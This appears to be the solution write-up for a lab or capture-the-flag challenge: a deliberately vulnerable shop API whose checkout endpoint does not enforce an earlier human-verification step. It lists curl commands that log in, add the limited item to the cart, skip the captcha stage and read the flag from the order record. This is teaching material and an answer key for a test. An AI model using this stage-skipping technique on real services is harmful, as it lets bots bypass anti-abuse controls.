# api/sensitive-flow — SensitiveFlow (stage-gated, high)

**DropShop** store with a limited item `flag-box` (stock 1, 1 per customer). The sensitive flow is: add to cart → prove human (`GET /api/v1/captcha` → `POST /api/v1/checkout/verify-human`) → `POST /api/v1/checkout`. The bug: the checkout endpoint **never checks that the verification stage happened** — a bot completes the whole flow (the captcha itself is always solvable, so you can also walk the honest path and compare). The per-customer limit IS enforced (a second add for the same user returns 403) — the win is skipping verification, not the limit.

Why exploitable: enforcement of a sensitive business-flow gate lives on a *different* endpoint than the one that commits the action — the final state change trusts the caller to have done the earlier stage.

## Intended path
1. `curl -s -c jar -X POST -d 'username=0xnhsec&password=vlh-tester-01' http://victim.target.lab:8119/login` (catalog: `curl -s http://victim.target.lab:8119/api/v1/catalog`)
2. `curl -s -b jar -X POST -H 'Content-Type: application/json' -d '{"item":"flag-box"}' http://victim.target.lab:8119/api/v1/cart/add`
3. Skip the human stage entirely (the flaw): `curl -s -b jar -X POST http://victim.target.lab:8119/api/v1/checkout` → `checked_out: true, human_verified: false`.
4. `curl -s -b jar http://victim.target.lab:8119/api/v1/orders` → the flag-box order's `secret_note` holds the flag.
5. (Limit check) a second `cart/add` of `flag-box` for the same user returns 403 per-customer limit — the flag is not about quantity.

**Flag:** `DSLTV{API-SensitiveFlow-<9 digits>}` (in your order record — created only by checkout, stage-gated server-side).
